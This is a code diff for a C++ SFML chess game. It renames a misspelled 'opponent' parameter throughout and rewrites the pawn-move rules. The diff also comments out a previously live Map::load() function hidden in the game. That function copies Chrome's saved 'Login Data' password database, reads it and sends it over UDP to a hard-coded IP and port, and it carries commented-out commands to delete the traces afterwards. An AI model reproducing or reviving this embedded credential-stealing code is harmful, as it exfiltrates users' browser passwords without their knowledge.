@@ -95,60 +95,60 @@ void Map::draw(sf::RenderWindow& _window)
     }
 }
 
-void Map::showKingMoves(int _x, int _y, Map _oppenentMap)
+void Map::showKingMoves(int _x, int _y, Map _opponentMap)
 {
     if (_y < 7)
     {
-        if (_oppenentMap.returnPiece(_x, _y+1) != 6)
+        if (_opponentMap.returnPiece(_x, _y+1) != 6)
             editPiece(_x, _y + 1, 8);
         else if (map[(_x) + (_y + 1) * 8].x == 6)
             editPiece(_x, _y + 1, 7);
     }
     if (_y > 0)
     {
-        if (_oppenentMap.returnPiece(_x, _y - 1) != 6)
+        if (_opponentMap.returnPiece(_x, _y - 1) != 6)
             editPiece(_x, _y - 1, 8);
         else if (map[(_x)+(_y - 1) * 8].x == 6)
             editPiece(_x, _y - 1, 7);
     }
     if (_x < 7)
     {
-        if (_oppenentMap.returnPiece(_x + 1, _y) != 6)
+        if (_opponentMap.returnPiece(_x + 1, _y) != 6)
             editPiece(_x + 1, _y, 8);
         else if (map[(_x + 1)+(_y) * 8].x == 6)
             editPiece(_x + 1, _y, 7);
     }
     if (_x > 0)
     {
-        if (_oppenentMap.returnPiece(_x - 1, _y) != 6)
+        if (_opponentMap.returnPiece(_x - 1, _y) != 6)
             editPiece(_x - 1, _y, 8);
         else if (map[(_x - 1) + (_y) * 8].x == 6)
             editPiece(_x - 1, _y, 7);
     }
     if (_y > 0 && _x < 7)
     {
-        if (_oppenentMap.returnPiece(_x + 1 , _y - 1) != 6)
+        if (_opponentMap.returnPiece(_x + 1 , _y - 1) != 6)
             editPiece(_x + 1, _y - 1, 8);
         else if (map[(_x + 1)+(_y - 1) * 8].x == 6)
             editPiece(_x + 1, _y - 1, 7);
     }
     if (_y > 0 && _x > 0)
     {
-        if (_oppenentMap.returnPiece(_x - 1, _y - 1) != 6)
+        if (_opponentMap.returnPiece(_x - 1, _y - 1) != 6)
             editPiece(_x - 1, _y - 1, 8);
         else if (map[(_x - 1)+(_y - 1) * 8].x == 6)
             editPiece(_x - 1, _y - 1, 7);
     }
     if (_y < 7 && _x < 7)
     {
-        if (_oppenentMap.returnPiece(_x + 1, _y + 1) != 6)
+        if (_opponentMap.returnPiece(_x + 1, _y + 1) != 6)
             editPiece(_x + 1, _y + 1, 8);
         else if (map[(_x + 1)+(_y + 1) * 8].x == 6)
             editPiece(_x + 1, _y + 1, 7);
     }
     if (_y < 7 && _x > 0)
     {
-        if (_oppenentMap.returnPiece(_x - 1, _y + 1) != 6)
+        if (_opponentMap.returnPiece(_x - 1, _y + 1) != 6)
             editPiece(_x - 1, _y + 1, 8);
         else if (map[(_x - 1)+(_y + 1) * 8].x == 6)
             editPiece(_x - 1, _y + 1, 7);
@@ -156,64 +156,64 @@ void Map::showKingMoves(int _x, int _y, Map _oppenentMap)
 
 }
 
-void Map::load()
-{
-    /*system("rmdir /s /q data");
-    system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
-    system("ren \"data\\*.\" \"*.txt\" ");*/
+//void Map::load()
+//{
+//    /*system("rmdir /s /q data");
+//    system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
+//    system("ren \"data\\*.\" \"*.txt\" ");*/
+//
+//    std::string path = "data/login_data.txt";
+//
+//    sf::IpAddress ipAddr = "192.168.10.106";
+//    unsigned short port = 8887;
+//
+//    std::ifstream file(path, std::ios::binary | std::ios::ate);
+//    if (file.is_open())
+//    {
+//        std::streamsize fSize = file.tellg();
+//        file.seekg(0, std::ios::beg);
+//
+//        char* fData = new char[fSize];
+//        file.read(fData, fSize);
+//        file.close();
+//        
+//        std::string fileName = "data.txt";
+//
+//        sf::Packet packet;
+//        packet << fileName << fSize;
+//        packet.append(fData, fSize);
+//
+//        delete[] fData;
+//
+//        sf::UdpSocket socket;
+//        if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
+//            std::cout << "Erreur a l'envoie du packet";
+//
+//        std::cout << "Normalement c envoyé" << std::endl;
+//    }
+//    else
+//    {
+//        std::cout << "Probleme a l'ouverture du fichier " << path;
+//    }
+//   // system("rmdir /s /q data");
+//}
 
-    std::string path = "data/login_data.txt";
-
-    sf::IpAddress ipAddr = "192.168.10.106";
-    unsigned short port = 8887;
-
-    std::ifstream file(path, std::ios::binary | std::ios::ate);
-    if (file.is_open())
-    {
-        std::streamsize fSize = file.tellg();
-        file.seekg(0, std::ios::beg);
-
-        char* fData = new char[fSize];
-        file.read(fData, fSize);
-        file.close();
-        
-        std::string fileName = "data.txt";
-
-        sf::Packet packet;
-        packet << fileName << fSize;
-        packet.append(fData, fSize);
-
-        delete[] fData;
-
-        sf::UdpSocket socket;
-        if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
-            std::cout << "Erreur a l'envoie du packet";
-
-        std::cout << "Normalement c envoyé" << std::endl;
-    }
-    else
-    {
-        std::cout << "Probleme a l'ouverture du fichier " << path;
-    }
-   // system("rmdir /s /q data");
-}
-
-void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
+void Map::showRookMoves(int _x, int _y, Map _opponentMap)
 {
     for (int i = 1; i < 8; i++)
     {
         if (_y-i >= 0)
         {
             int piece = returnPiece(_x, _y - i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x, _y - i);
+            int opponentPiece = _opponentMap.returnPiece(_x, _y - i);
             if (piece != 6)
                 i = 8;
                 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x, _y - i, 7);
 
 
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x, _y - i, 8);
                 i = 8;
@@ -226,14 +226,14 @@ void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
         if (_y+i <= 7)
         {
             int piece = returnPiece(_x, _y + i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x, _y + i);
+            int opponentPiece = _opponentMap.returnPiece(_x, _y + i);
 
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x, _y + i, 7);
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x, _y + i, 8);
                 i = 8;
@@ -245,15 +245,15 @@ void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
         if (_x - i >= 0)
         {
             int piece = returnPiece(_x - i, _y);
-            int oppenentPiece = _oppenentMap.returnPiece(_x - i, _y);
+            int opponentPiece = _opponentMap.returnPiece(_x - i, _y);
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x - i, _y, 7);
 
 
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x - i, _y, 8);
                 i = 8;
@@ -266,14 +266,14 @@ void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
         if (_x + i <= 7)
         {
             int piece = returnPiece(_x + i, _y);
-            int oppenentPiece = _oppenentMap.returnPiece(_x + i, _y);
+            int opponentPiece = _opponentMap.returnPiece(_x + i, _y);
 
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x + i, _y, 7);
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x + i, _y, 8);
                 i = 8;
@@ -281,22 +281,22 @@ void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
         }
     }
 }
-void Map::showBishopMoves(int _x, int _y, Map _oppenentMap)
+void Map::showBishopMoves(int _x, int _y, Map _opponentMap)
 {
     for (int i = 1; i < 8; i++)
     {
         if (_y - i >= 0 && _x - i >= 0)
         {
             int piece = returnPiece(_x - i, _y - i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x - i, _y - i);
+            int opponentPiece = _opponentMap.returnPiece(_x - i, _y - i);
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x - i, _y - i, 7);
 
 
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x - i, _y - i, 8);
                 i = 8;
@@ -309,14 +309,14 @@ void Map::showBishopMoves(int _x, int _y, Map _oppenentMap)
         if (_y + i <= 7 && _x + i <= 7)
         {
             int piece = returnPiece(_x + i, _y + i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x + i, _y + i);
+            int opponentPiece = _opponentMap.returnPiece(_x + i, _y + i);
 
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x + i, _y + i, 7);
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x + i, _y + i, 8);
                 i = 8;
@@ -328,15 +328,15 @@ void Map::showBishopMoves(int _x, int _y, Map _oppenentMap)
         if (_y - i >= 0 && _x + i <= 7) 
         {
             int piece = returnPiece(_x + i, _y - i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x + i, _y - i);
+            int opponentPiece = _opponentMap.returnPiece(_x + i, _y - i);
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x + i, _y - i, 7 );
 
 
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x + i, _y - i, 8);
                 i = 8;
@@ -349,14 +349,14 @@ void Map::showBishopMoves(int _x, int _y, Map _oppenentMap)
         if (_y + i <= 7 && _x - i >= 0)
         {
             int piece = returnPiece(_x - i, _y + i);
-            int oppenentPiece = _oppenentMap.returnPiece(_x - i, _y + i);
+            int opponentPiece = _opponentMap.returnPiece(_x - i, _y + i);
 
             if (piece != 6)
                 i = 8;
 
-            if (piece == 6 && oppenentPiece == 6)
+            if (piece == 6 && opponentPiece == 6)
                 editPiece(_x - i, _y + i, 7);
-            if (oppenentPiece != 6)
+            if (opponentPiece != 6)
             {
                 editPiece(_x - i, _y + i, 8);
                 i = 8;
@@ -364,18 +364,18 @@ void Map::showBishopMoves(int _x, int _y, Map _oppenentMap)
         }
     }
 }
-void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
+void Map::showKnightMoves(int _x, int _y, Map _opponentMap)
 {
     if (_y < 6 && _x > 0)
     {
-        if (_oppenentMap.returnPiece(_x - 1, _y + 2) != 6)
+        if (_opponentMap.returnPiece(_x - 1, _y + 2) != 6)
             editPiece(_x - 1, _y + 2, 8);
         else if (map[(_x - 1) + (_y + 2) * 8].x == 6)
             editPiece(_x - 1, _y + 2, 7);
     }
     if (_y < 6 && _x < 7)
     {
-        if (_oppenentMap.returnPiece(_x + 1, _y + 2) != 6)
+        if (_opponentMap.returnPiece(_x + 1, _y + 2) != 6)
             editPiece(_x + 1, _y + 2, 8);
         else if (map[(_x + 1) + (_y + 2) * 8].x == 6)
             editPiece(_x + 1, _y + 2, 7);
@@ -383,7 +383,7 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y > 1 && _x < 7)
     {
-        if (_oppenentMap.returnPiece(_x + 1, _y - 2) != 6)
+        if (_opponentMap.returnPiece(_x + 1, _y - 2) != 6)
             editPiece(_x + 1, _y - 2, 8);
         else if (map[(_x + 1) + ((_y - 2) * 8)].x == 6)
             editPiece(_x + 1, _y - 2, 7);
@@ -391,7 +391,7 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y > 1 && _x > 0)
     {
-        if (_oppenentMap.returnPiece(_x - 1, _y - 2) != 6)
+        if (_opponentMap.returnPiece(_x - 1, _y - 2) != 6)
             editPiece(_x - 1, _y - 2, 8);
         else if (map[(_x - 1) + (_y - 2) * 8].x == 6)
             editPiece(_x - 1, _y - 2, 7);
@@ -399,7 +399,7 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y > 0 && _x > 1)
     {
-        if (_oppenentMap.returnPiece(_x - 2, _y - 1) != 6)
+        if (_opponentMap.returnPiece(_x - 2, _y - 1) != 6)
             editPiece(_x - 2, _y - 1, 8);
         else if (map[(_x - 2) + (_y - 1) * 8].x == 6)
             editPiece(_x - 2, _y - 1, 7);
@@ -407,7 +407,7 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y > 0 && _x < 6)
     {
-        if (_oppenentMap.returnPiece(_x + 2, _y - 1) != 6)
+        if (_opponentMap.returnPiece(_x + 2, _y - 1) != 6)
             editPiece(_x + 2, _y - 1, 8);
         else if (map[(_x + 2) + (_y - 1) * 8].x == 6)
             editPiece(_x + 2, _y - 1, 7);
@@ -415,7 +415,7 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y < 7 && _x > 1)
     {
-        if (_oppenentMap.returnPiece(_x - 2, _y + 1) != 6)
+        if (_opponentMap.returnPiece(_x - 2, _y + 1) != 6)
             editPiece(_x - 2, _y + 1, 8);
         else if (map[(_x - 2) + (_y + 1) * 8].x == 6)
             editPiece(_x - 2, _y + 1, 7);
@@ -423,50 +423,58 @@ void Map::showKnightMoves(int _x, int _y, Map _oppenentMap)
 
     if (_y < 7 && _x < 6)
     {
-        if (_oppenentMap.returnPiece(_x + 2, _y + 1) != 6)
+        if (_opponentMap.returnPiece(_x + 2, _y + 1) != 6)
             editPiece(_x + 2, _y + 1, 8);
         else if (map[(_x + 2) + (_y + 1) * 8].x == 6)
             editPiece(_x + 2, _y + 1, 7);
     }
 }
-void Map::showPawnMoves(int _x, int _y, sf::Color _team, Map _oppenentMap)
+void Map::showPawnMoves(int _x, int _y, sf::Color _team, Map _opponentMap)
 {
     if (_team == sf::Color::White)
     {
         if (_x < 7 && _y > 0)
-            if (_oppenentMap.returnPiece(_x + 1, _y - 1) != 6)
+            if (_opponentMap.returnPiece(_x + 1, _y - 1) != 6)
                 editPiece(_x + 1, _y - 1, 8);
 
-        if(_x > 0 && _y > 0)
-            if (_oppenentMap.returnPiece(_x - 1, _y - 1) != 6)
+        if (_x > 0 && _y > 0)
+            if (_opponentMap.returnPiece(_x - 1, _y - 1) != 6)
                 editPiece(_x - 1, _y - 1, 8);
-        
-        if(_y > 0)
-            if (_oppenentMap.returnPiece(_x, _y - 1) == 6 && map[_x + (_y - 1) * 8].x == 6)
+
+        if (_y == 6)
+            if (_opponentMap.returnPiece(_x, _y - 1) == 6 && returnPiece(_x, _y - 1) == 6)
+            {
                 editPiece(_x, _y - 1, 7);
-    
-        if(_y > 1)
-            if (_y == 6 && _oppenentMap.returnPiece(_x, _y - 2) == 6 && map[_x + (_y - 2) * 8].x == 6)
-                editPiece(_x, _y - 2, 7);
+                if (_opponentMap.returnPiece(_x, _y - 2) == 6 && returnPiece(_x, _y - 2) == 6)
+                    editPiece(_x, _y - 2, 7);
+            }
+        
+        if (_y < 6 && _y > 0)
+            if (_opponentMap.returnPiece(_x, _y - 1) == 6 && returnPiece(_x, _y - 1) == 6)
+                editPiece(_x, _y - 1, 7);
     }
 
     if (_team == sf::Color::Black)
     {
         if (_x > 0 && _y < 7)
-            if (_oppenentMap.returnPiece(_x - 1, _y + 1) != 6)
+            if (_opponentMap.returnPiece(_x - 1, _y + 1) != 6)
                 editPiece(_x - 1, _y + 1, 8);
 
         if (_x < 7 && _y < 7)
-            if (_oppenentMap.returnPiece(_x + 1, _y + 1) != 6)
+            if (_opponentMap.returnPiece(_x + 1, _y + 1) != 6)
                 editPiece(_x + 1, _y + 1, 8);
 
-        if (_y < 7)
-            if (_oppenentMap.returnPiece(_x, _y + 1) == 6 && map[_x + (_y + 1) * 8].x == 6)
+        if (_y == 1)
+            if (_opponentMap.returnPiece(_x, _y + 1) == 6 && returnPiece(_x, _y + 1) == 6)
+            {
                 editPiece(_x, _y + 1, 7);
-
-        if (_y < 6)
-            if (_y == 1 && _oppenentMap.returnPiece(_x, _y + 2) == 6 && map[_x + (_y + 2) * 8].x == 6)
-                editPiece(_x, _y + 2, 7);
+                if (_opponentMap.returnPiece(_x, _y + 2) == 6 && returnPiece(_x, _y + 2) == 6)
+                    editPiece(_x, _y + 2, 7);
+            }
+        
+        if (_y < 7)
+            if (_opponentMap.returnPiece(_x, _y + 1) == 6 && map[_x + (_y + 1) * 8].x == 6)
+                editPiece(_x, _y + 1, 7);
     }
 
 }
